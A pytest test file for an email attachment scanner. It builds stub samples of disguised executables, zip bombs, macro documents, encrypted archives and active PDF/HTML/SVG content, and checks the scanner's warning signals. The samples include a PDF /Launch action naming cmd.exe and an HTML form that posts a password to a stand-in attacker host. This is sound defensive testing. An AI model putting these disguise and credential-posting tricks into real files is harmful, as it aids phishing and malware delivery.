import gzip
import io
import struct
import tarfile
import zipfile
import zlib

import pytest

from zetru_analyzer import attachments, pdfcrypt
from zetru_analyzer.packs import default_packs

PACKS = default_packs()
FAKE_PE = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x40) + b"PE\x00\x00" + b"\x00" * 64
ENDOFCHAIN, FREESECT, FATSECT, NOSTREAM = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFF


def inspect(data, name, ctype="application/octet-stream"):
    return attachments.inspect("2", name, ctype, data, PACKS)


def zip_of(files: dict, encrypt_names=()) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    data = bytearray(buf.getvalue())
    for target in encrypt_names:
        for sig, flag_off, name_len_off, name_off in ((b"PK\x03\x04", 6, 26, 30), (b"PK\x01\x02", 8, 28, 46)):
            pos = data.find(sig)
            while pos >= 0:
                n = struct.unpack_from("<H", data, pos + name_len_off)[0]
                if bytes(data[pos + name_off:pos + name_off + n]) == target.encode():
                    struct.pack_into("<H", data, pos + flag_off, struct.unpack_from("<H", data, pos + flag_off)[0] | 1)
                pos = data.find(sig, pos + 4)
    return bytes(data)


def cfb(entries, root_clsid=b"\0" * 16) -> bytes:
    """Minimal compound file (v3, 512-byte sectors) for tests: entries = [(name, type, data|None)]."""
    sector = 512
    all_entries = [("Root Entry", 5, None)] + list(entries)
    dir_sectors = (len(all_entries) * 128 + sector - 1) // sector
    streams = []
    next_sector = 1 + dir_sectors
    for name, etype, data in all_entries:
        if etype == 2 and data is not None:
            padded = data + b"\0" * (-len(data) % sector)
            streams.append((next_sector, padded))
            next_sector += len(padded) // sector
        else:
            streams.append(None)
    total = next_sector
    fat = [FREESECT] * (sector // 4)
    fat[0] = FATSECT
    for i in range(dir_sectors):
        fat[1 + i] = 2 + i if i < dir_sectors - 1 else ENDOFCHAIN
    for item in streams:
        if item:
            start, padded = item
            count = len(padded) // sector
            for j in range(count):
                fat[start + j] = start + j + 1 if j < count - 1 else ENDOFCHAIN
    assert total <= len(fat)
    header = bytearray(512)
    header[0:8] = attachments.OLE2_MAGIC
    struct.pack_into("<HHHHH", header, 0x18, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<I", header, 0x2C, 1)            # FAT sectors
    struct.pack_into("<I", header, 0x30, 1)            # first directory sector
    struct.pack_into("<I", header, 0x38, 4096)         # mini stream cutoff
    struct.pack_into("<I", header, 0x3C, ENDOFCHAIN)   # no mini FAT
    struct.pack_into("<I", header, 0x44, ENDOFCHAIN)   # no extra DIFAT
    difat = [0] + [FREESECT] * 108
    struct.pack_into("<109I", header, 0x4C, *difat)
    directory = bytearray(dir_sectors * sector)
    for index, (name, etype, data) in enumerate(all_entries):
        raw = bytearray(128)
        encoded = name.encode("utf-16-le") + b"\0\0"
        raw[0:len(encoded)] = encoded
        struct.pack_into("<HBB", raw, 0x40, len(encoded), etype, 1)
        struct.pack_into("<III", raw, 0x44, NOSTREAM, index + 1 if index + 1 < len(all_entries) else NOSTREAM, NOSTREAM)
        if index == 0:
            raw[0x50:0x60] = root_clsid
            struct.pack_into("<I", raw, 0x4C, 1 if len(all_entries) > 1 else NOSTREAM)
        item = streams[index]
        struct.pack_into("<IQ", raw, 0x74, item[0] if item else ENDOFCHAIN, len(data) if data is not None else 0)
        directory[index * 128:(index + 1) * 128] = raw
    body = struct.pack(f"<{sector // 4}I", *fat) + bytes(directory)
    for item in streams:
        if item:
            body += item[1]
    return bytes(header) + body


# Magic and mismatch ---------------------------------------------------------------------------------------

def test_sniff_types():
    assert attachments.sniff(FAKE_PE) == "pe"
    assert attachments.sniff(b"%PDF-1.7\n") == "pdf"
    assert attachments.sniff(b"\x89PNG\r\n\x1a\n....") == "png"
    assert attachments.sniff(b"<!DOCTYPE html><html>") == "html"
    assert attachments.sniff(b'<?xml version="1.0"?><svg xmlns="x"></svg>') == "svg"
    assert attachments.sniff(b"MZ but no PE header" + b"\0" * 100) != "pe"
    assert attachments.sniff(attachments.LNK_MAGIC + b"\0" * 20) == "lnk"


def test_executable_disguised_as_pdf():
    report = inspect(FAKE_PE, "Rechnung.pdf", "application/pdf")
    assert {"ATT_EXECUTABLE", "ATT_TYPE_MISMATCH"} <= set(report.signals)


def test_executable_without_extension_is_flagged():
    assert "ATT_EXECUTABLE" in inspect(FAKE_PE, "document").signals


def test_same_class_image_is_not_a_mismatch():
    png = b"\x89PNG\r\n\x1a\n" + b"\0" * 50
    assert inspect(png, "foto.jpg", "image/jpeg").signals == {}


def test_html_disguised_as_pdf_and_double_extension():
    assert "ATT_TYPE_MISMATCH" in inspect(b"<html><body>x</body></html>", "Rechnung.pdf").signals
    assert "ATT_TYPE_MISMATCH" in inspect(b"plain", "Rechnung.pdf.exe").signals
    assert "ATT_TYPE_MISMATCH" in inspect(b"<html></html>", "invoice.pdf   .html").signals
    assert "ATT_TYPE_MISMATCH" not in inspect(b"data", "backup.tar.gz").signals


# Archives ---------------------------------------------------------------------------------------------------

def test_zip_with_executable_is_risky():
    report = inspect(zip_of({"docs/readme.txt": b"x", "Rechnung.pdf.exe": FAKE_PE}), "docs.zip", "application/zip")
    assert report.signals["ATT_ARCHIVE_RISKY"] == {"count": 1}


def test_nested_zip_two_levels():
    inner = zip_of({"setup.js": b"alert(1)"})
    outer = zip_of({"inner.zip": inner})
    assert "ATT_ARCHIVE_RISKY" in inspect(outer, "a.zip").signals
    third = zip_of({"level2.zip": zip_of({"level3.zip": inner})})
    assert "ATT_ARCHIVE_OPAQUE" in inspect(third, "a.zip").signals   # beyond 2 nesting levels


def test_clean_zip_has_no_signal():
    assert inspect(zip_of({"a.pdf": b"%PDF-1.4", "b.txt": b"t"}), "files.zip").signals == {}


def test_encrypted_zip_member():
    report = inspect(zip_of({"secret.pdf": b"%PDF-1.4"}, encrypt_names=["secret.pdf"]), "secret.zip")
    assert "ATT_ENCRYPTED" in report.signals


def test_zip_limits():
    many = zip_of({f"f{i}.txt": b"" for i in range(1001)})
    assert "ATT_ARCHIVE_OPAQUE" in inspect(many, "many.zip").signals
    bomb = bytearray(zip_of({"big.bin": b"x"}))
    pos = bomb.find(b"PK\x01\x02")
    struct.pack_into("<I", bomb, pos + 24, 300 * 1024 * 1024)  # declared uncompressed size
    assert "ATT_ARCHIVE_OPAQUE" in inspect(bytes(bomb), "bomb.zip").signals


def test_rar_and_7z_are_opaque():
    assert "ATT_ARCHIVE_OPAQUE" in inspect(b"Rar!\x1a\x07\x01\x00" + b"\0" * 40, "x.rar").signals
    assert "ATT_ARCHIVE_OPAQUE" in inspect(b"7z\xbc\xaf\x27\x1c" + b"\0" * 40, "x.7z").signals


def test_tar_and_gzip_listing():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name, data in (("ok.txt", b"hi"), ("run.vbs", b"x")):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    tar = buf.getvalue()
    assert "ATT_ARCHIVE_RISKY" in inspect(tar, "a.tar").signals
    assert "ATT_ARCHIVE_RISKY" in inspect(gzip.compress(tar), "a.tar.gz").signals
    single = gzip.compress(b"col1,col2\n")
    assert inspect(single, "report.csv.gz").signals == {}
    assert "ATT_ARCHIVE_RISKY" in inspect(gzip.compress(b"x"), "invoice.exe.gz").signals


def test_ooxml_macro_detection():
    docm = zip_of({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<d/>", "word/vbaProject.bin": b"vba"})
    report = inspect(docm, "a.docm")
    assert report.real_type == "ooxml" and "ATT_MACRO" in report.signals
    docx = zip_of({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<d/>"})
    assert inspect(docx, "a.docx").signals == {}
    renamed = zip_of({"x.exe": FAKE_PE})
    assert "ATT_TYPE_MISMATCH" in inspect(renamed, "a.docx").signals


# OLE2 -------------------------------------------------------------------------------------------------------

def test_ole2_macros_and_names():
    data = cfb([("Macros", 1, None), ("VBA", 1, None), ("WordDocument", 2, b"\xec\xa5" + b"\0" * 4094)])
    info = attachments.ole2_info(data)
    assert info.macros and not info.encrypted and "WordDocument" in info.names
    assert "ATT_MACRO" in inspect(data, "a.doc").signals


def test_ole2_word_encryption_flag():
    fib = bytearray(4096)
    struct.pack_into("<H", fib, 0, 0xA5EC)
    struct.pack_into("<H", fib, 0x0A, 0x0100)
    assert "ATT_ENCRYPTED" in inspect(cfb([("WordDocument", 2, bytes(fib))]), "a.doc").signals


def test_ole2_excel_filepass():
    stream = struct.pack("<HH", 0x0809, 16) + b"\0" * 16 + struct.pack("<HH", 0x002F, 2) + b"\0\0"
    stream += b"\0" * (4096 - len(stream))
    assert "ATT_ENCRYPTED" in inspect(cfb([("Workbook", 2, stream)]), "a.xls").signals


def test_encrypted_ooxml_container():
    data = cfb([("EncryptionInfo", 2, b"\0" * 4096), ("EncryptedPackage", 2, b"\0" * 4096)])
    assert "ATT_ENCRYPTED" in inspect(data, "a.docx").signals
    assert "ATT_TYPE_MISMATCH" not in inspect(data, "a.docx").signals


def test_msi_detected_by_root_clsid():
    data = cfb([("SummaryInformation", 2, b"\0" * 4096)], root_clsid=attachments.MSI_CLSID)
    report = inspect(data, "update.doc")
    assert "ATT_EXECUTABLE" in report.signals and "ATT_TYPE_MISMATCH" in report.signals


def test_corrupt_ole2_does_not_crash():
    assert "ATT_MACRO" not in inspect(attachments.OLE2_MAGIC + b"\xff" * 600, "a.doc").signals


# PDF --------------------------------------------------------------------------------------------------------

def test_pdf_tokens():
    assert "ATT_PDF_ACTIVE" in inspect(b"%PDF-1.4 1 0 obj << /S /JavaScript /JS (x) >> endobj", "a.pdf").signals
    assert "ATT_PDF_ACTIVE" in inspect(b"%PDF-1.4 << /S /Launch /F (cmd.exe) >>", "a.pdf").signals
    assert "ATT_PDF_ACTIVE" in inspect(b"%PDF-1.4 << /Type /EmbeddedFile >>", "a.pdf").signals
    assert "ATT_PDF_ACTIVE" in inspect(b"%PDF-1.4 << /S /J#61vaScript >>", "a.pdf").signals   # hex escape
    assert inspect(b"%PDF-1.4 << /OpenAction [3 0 R /Fit] >>", "a.pdf").signals == {}


def test_pdf_javascript_hidden_in_object_stream():
    hidden = zlib.compress(b"1 0 << /S /JavaScript /JS (app.alert(1)) >>")
    pdf = (b"%PDF-1.5\n5 0 obj << /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length "
           + str(len(hidden)).encode() + b" >>\nstream\n" + hidden + b"\nendstream\nendobj\n%%EOF")
    assert "ATT_PDF_ACTIVE" in inspect(pdf, "a.pdf").signals


def _pypdf_encrypted(user: str, algorithm: str) -> bytes:
    pypdf = pytest.importorskip("pypdf")
    writer = pypdf.PdfWriter()
    writer.add_blank_page(width=200, height=200)
    writer.encrypt(user_password=user, owner_password="owner-secret", algorithm=algorithm)
    out = io.BytesIO()
    writer.write(out)
    return out.getvalue()


@pytest.mark.parametrize("algorithm", ["RC4-40", "RC4-128", "AES-128", "AES-256-R5", "AES-256"])
def test_pdf_permission_only_encryption_is_not_password_protected(algorithm):
    data = _pypdf_encrypted("", algorithm)
    assert pdfcrypt.opens_without_password(data) is True
    assert "ATT_ENCRYPTED" not in inspect(data, "statement.pdf").signals


@pytest.mark.parametrize("algorithm", ["RC4-40", "RC4-128", "AES-128", "AES-256-R5", "AES-256"])
def test_pdf_user_password_is_detected(algorithm):
    data = _pypdf_encrypted("open-sesame", algorithm)
    assert pdfcrypt.opens_without_password(data) is False
    assert "ATT_ENCRYPTED" in inspect(data, "statement.pdf").signals


def test_rc4_known_vector():
    assert pdfcrypt.rc4(b"Key", b"Plaintext").hex() == "bbf316e8d940af0ad3"


# HTML / SVG -------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("content", [
    b"<html><script>alert(1)</script></html>",
    b'<html><body onload="go()">x</body></html>',
    b'<html><form action="https://evil.example/post"><input type="password"></form></html>',
    b'<html><a href="https://evil.example">x</a></html>',
    b'<html><img src="//evil.example/p.png"></html>',
    b"<html><p>" + b"QUFB" * 3500 + b"</p></html>",
    b'<svg xmlns="http://www.w3.org/2000/svg"><a xlink:href="javascript:alert(1)">x</a></svg>',
])
def test_html_svg_active(content):
    name = "a.svg" if content.startswith(b"<svg") else "a.html"
    assert "ATT_HTML_SVG_ACTIVE" in inspect(content, name).signals


def test_plain_html_receipt_is_not_active():
    content = b'<html><body><h1>Receipt</h1><p>Total: 12.00 EUR</p><p style="color:#333">Thanks</p></body></html>'
    assert inspect(content, "receipt.html").signals == {}
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><circle r="4"/></svg>'
    assert inspect(svg, "logo.svg").signals == {}
